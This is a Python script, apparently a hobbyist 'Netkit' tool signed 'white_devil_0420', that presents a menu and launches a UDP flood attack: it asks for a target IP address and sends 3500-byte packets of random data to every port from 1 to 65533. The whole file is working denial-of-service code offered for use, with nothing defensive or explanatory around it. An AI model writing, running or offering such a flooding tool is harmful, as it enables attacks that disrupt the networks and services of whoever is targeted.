import os
import subprocess
import socket
import random
import time


def ip_flood_attack():
    # Create a UDP socket
    udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    # Generate 3500 bytes of random data to be sent in each packet
    packet_data = random._urandom(3500)
    # Prompt the user to enter the target IP address
    ip = input("[+] Target's IP: ")
    # Clear the screen
    os.system("clear")
    # Print a message indicating that the attack is starting
    print("Attack starting...")
    time.sleep(3)
    # Send packets to every port on the target IP address
    sent = 0
    for port in range(1, 65534):
        # Send a packet to the target IP address and port
        udp_socket.sendto(packet_data, (ip, port))
        # Increment the number of packets sent
        sent += 1
        # Print a message indicating the number of packets sent, the target IP address, and the port number
        print("started")
    

def main():
    os.system("clear")
    os.system("figlet Netkit | lolcat")
    
    message = "    white_devil_0420"
    # Use subprocess to execute the echo command and pipe the message to lolcat
    p1 = subprocess.Popen(['echo', '-n', message], stdout=subprocess.PIPE)
    p2 = subprocess.Popen(['lolcat'], stdin=p1.stdout, stdout=subprocess.PIPE)
    # Decode the output and print it
    output = p2.communicate()[0].decode('utf-8')
    print(output)

    message = """\033[33m
        
        
        1. start ip flood attack on an ip
        2. exit _from tool
        █▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
    \033[0m
    """
    print(message)

    choice = int(input("\033[1m\033[33;32m[+] what you want input option:->\033[0m "))

    if choice == 1:
        ip_flood_attack()
    elif choice == 2:
        print("white_devil_0420 ")
        print("Ok bye...")
        print("Thank you for using ip_flood...")
        print("@white_dwvil_0420 on telegram ")
        exit()
    else:
        print("\033[31m[ERROR!]\033[0m Invalid input pls try again...")

if __name__ == '__main__':
    main()

